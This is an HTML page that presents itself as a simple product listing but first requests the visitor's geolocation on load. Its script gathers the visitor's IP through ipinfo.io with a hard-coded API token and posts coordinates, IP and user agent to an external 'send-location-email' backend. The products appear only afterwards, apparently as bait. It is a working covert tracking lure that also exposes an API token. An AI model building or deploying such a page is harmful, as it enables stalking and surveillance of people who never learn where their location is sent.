<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker with Products</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f9f9f9;
            color: #333;
        }

        h2 {
            color: #222;
        }

        .hidden {
            display: none;
        }

        .products {
            margin-top: 20px;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .product {
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            width: 150px;
            background: #fff;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }

            .product:hover {
                transform: scale(1.05);
            }

            .product img {
                max-width: 100%;
                height: 80px;
                object-fit: cover;
            }
    </style>
</head>
<body>
    <div id="location-section">
        <h2>Getting Your Location...</h2>
        <p id="status">Please allow location access.</p>
    </div>

    <div id="products-section" class="hidden">
        <h2>Product Listing</h2>
        <div class="products" id="product-list"></div>
    </div>

    <script>
        const backendUrl = "https://location-tracker-backend-wvgn.onrender.com/send-location-email";
        const ipinfoToken = "89c6e154a78451"; // IPinfo Token

        const products = [
            { name: "Smart Watch", price: "₹2,999", image: "https://via.placeholder.com/150?text=Smart+Watch" },
            { name: "Wireless Earbuds", price: "₹1,499", image: "https://via.placeholder.com/150?text=Earbuds" },
            { name: "Gaming Mouse", price: "₹799", image: "https://via.placeholder.com/150?text=Mouse" },
            { name: "Bluetooth Speaker", price: "₹1,999", image: "https://via.placeholder.com/150?text=Speaker" },
            { name: "Laptop Bag", price: "₹999", image: "https://via.placeholder.com/150?text=Bag" }
        ];

        function renderProducts() {
            const productList = document.getElementById('product-list');
            products.forEach(p => {
                const div = document.createElement('div');
                div.className = 'product';
                div.innerHTML = `<img src="${p.image}" alt="${p.name}"><h3>${p.name}</h3><p>${p.price}</p>`;
                productList.appendChild(div);
            });
        }

        async function getUserIP() {
            try {
                const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
                const data = await response.json();
                return data.ip || 'N/A';
            } catch (error) {
                console.error("IP fetch failed:", error);
                return 'N/A';
            }
        }

        async function sendLocation(latitude, longitude) {
            const userAgent = navigator.userAgent;
            const ip = await getUserIP();

            try {
                await fetch(backendUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude, userAgent, ip })
                });
                document.getElementById('location-section').classList.add('hidden');
                document.getElementById('products-section').classList.remove('hidden');
                renderProducts();
            } catch (error) {
                console.error("Error sending location:", error);
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendLocation(lat, lon);
                    },
                    (error) => {
                        document.getElementById('status').innerText = "Location access denied.";
                    }
                );
            } else {
                document.getElementById('status').innerText = "Geolocation not supported.";
            }
        }

        getLocation();
    </script>
</body>
</html>
